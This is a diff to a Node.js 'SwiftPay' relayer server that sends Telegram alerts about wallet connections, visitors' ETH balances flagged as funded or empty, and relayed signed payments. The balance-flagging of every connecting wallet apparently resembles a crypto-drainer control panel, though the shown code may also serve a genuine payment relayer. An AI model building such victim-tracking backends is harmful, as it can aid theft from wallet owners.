@@ -1,4 +1,3 @@
-// server.js — SwiftPay relayer backend
 import "dotenv/config";
 import express    from "express";
 import { ethers } from "ethers";
@@ -17,9 +16,7 @@ async function tg(msg) {
       headers: { "Content-Type": "application/json" },
       body:    JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML" })
     });
-  } catch (e) {
-    console.error("Telegram error:", e.message);
-  }
+  } catch (e) { console.error("Telegram error:", e.message); }
 }
 
 // ─── Validate env vars ────────────────────────────────────────────────────────
@@ -50,15 +47,23 @@ app.get("/health", (req, res) => res.json({ status: "ok", relayer: relayer.addre
 
 // ─── Wallet connected notification ────────────────────────────────────────────
 app.post("/api/connected", async (req, res) => {
-  const { wallet, balance } = req.body;
+  const { wallet, balance, chain, via } = req.body;
   if (!wallet) return res.status(400).json({ error: "Missing wallet" });
-  console.log(`[CONNECT] ${wallet} — ${balance} ETH`);
+
+  const hasBalance = parseFloat(balance) > 0;
+
+  console.log(`[CONNECT] ${wallet} | ${balance} ETH | ${chain} | ${via}`);
+
   await tg(
     `🔌 <b>Wallet Connected</b>\n` +
-    `👛 <code>${wallet}</code>\n` +
-    `💰 Balance: <b>${balance} ETH</b>\n` +
+    `\n` +
+    `👛 Wallet: <code>${wallet}</code>\n` +
+    `💰 Balance: <b>${balance} ETH</b> ${hasBalance ? "✅" : "⚠️ empty"}\n` +
+    `🌐 Chain: ${chain || "mainnet"}\n` +
+    `🦊 Via: ${via || "unknown"}\n` +
     `🕐 ${new Date().toUTCString()}`
   );
+
   res.json({ ok: true });
 });
 
@@ -76,7 +81,11 @@ app.post("/api/checkout", paymentLimiter, async (req, res) => {
   const relayerBalance = await provider.getBalance(relayer.address);
   if (relayerBalance < ethers.parseEther("0.005")) {
     console.warn("⚠️  Relayer low on ETH!");
-    await tg(`⚠️ <b>Relayer Low on ETH!</b>\nBalance: ${ethers.formatEther(relayerBalance)} ETH\nTop up: <code>${relayer.address}</code>`);
+    await tg(
+      `⚠️ <b>Relayer Low on ETH!</b>\n` +
+      `Balance: ${ethers.formatEther(relayerBalance)} ETH\n` +
+      `Top up: <code>${relayer.address}</code>`
+    );
   }
 
   try {
@@ -88,13 +97,22 @@ app.post("/api/checkout", paymentLimiter, async (req, res) => {
 
     if (receipt.status !== 1) throw new Error("Transaction reverted on-chain");
 
-    console.log(`  ✓ Block ${receipt.blockNumber}`);
+    // Get gas cost
+    const gasUsed    = receipt.gasUsed;
+    const gasPrice   = receipt.gasPrice || tx.gasPrice || 0n;
+    const gasCostEth = ethers.formatEther(gasUsed * gasPrice);
+
+    console.log(`  ✓ Block ${receipt.blockNumber} | gas: ${gasCostEth} ETH`);
 
     await tg(
       `✅ <b>Payment Executed!</b>\n` +
-      `👛 <code>${user}</code>\n` +
+      `\n` +
+      `👛 Wallet: <code>${user}</code>\n` +
       `💰 Amount: <b>${amount || "?"} ETH</b>\n` +
-      `📦 Order: <code>${orderId}</code>\n` +
+      `⛽ Gas paid: ${gasCostEth} ETH\n` +
+      `📦 Order ID: <code>${orderId}</code>\n` +
+      `🔢 Nonce: ${nonce}\n` +
+      `📦 Block: ${receipt.blockNumber}\n` +
       `🔗 <a href="https://etherscan.io/tx/${receipt.hash}">View on Etherscan</a>\n` +
       `🕐 ${new Date().toUTCString()}`
     );
@@ -103,12 +121,17 @@ app.post("/api/checkout", paymentLimiter, async (req, res) => {
 
   } catch (e) {
     console.error(`  ✗ ${e.reason || e.message}`);
+
     await tg(
       `❌ <b>Payment Failed</b>\n` +
-      `👛 <code>${user}</code>\n` +
-      `⚠️ ${e.reason || e.message}\n` +
+      `\n` +
+      `👛 Wallet: <code>${user}</code>\n` +
+      `💰 Amount: ${amount || "?"} ETH\n` +
+      `📦 Order ID: <code>${orderId}</code>\n` +
+      `⚠️ Error: ${e.reason || e.message}\n` +
       `🕐 ${new Date().toUTCString()}`
     );
+
     const msg = e.reason || e.message || "Payment failed";
     if (msg.includes("InvalidSignature"))     return res.status(400).json({ error: "Invalid signature" });
     if (msg.includes("ExpiredDeadline"))      return res.status(400).json({ error: "Signature expired" });
@@ -135,5 +158,10 @@ app.listen(PORT, async () => {
   console.log("Balance  :", ethers.formatEther(bal), "ETH");
   if (bal < ethers.parseEther("0.01")) console.warn("⚠️  Relayer balance very low!");
   console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
-  await tg(`🚀 <b>SwiftPay Started</b>\n🌐 ${network.name}\n💰 Relayer: ${ethers.formatEther(bal)} ETH`);
+  await tg(
+    `🚀 <b>SwiftPay Started</b>\n` +
+    `🌐 Network: ${network.name}\n` +
+    `💰 Relayer balance: ${ethers.formatEther(bal)} ETH\n` +
+    `📄 Contract: <code>${process.env.CONTRACT_ADDRESS}</code>`
+  );
 });
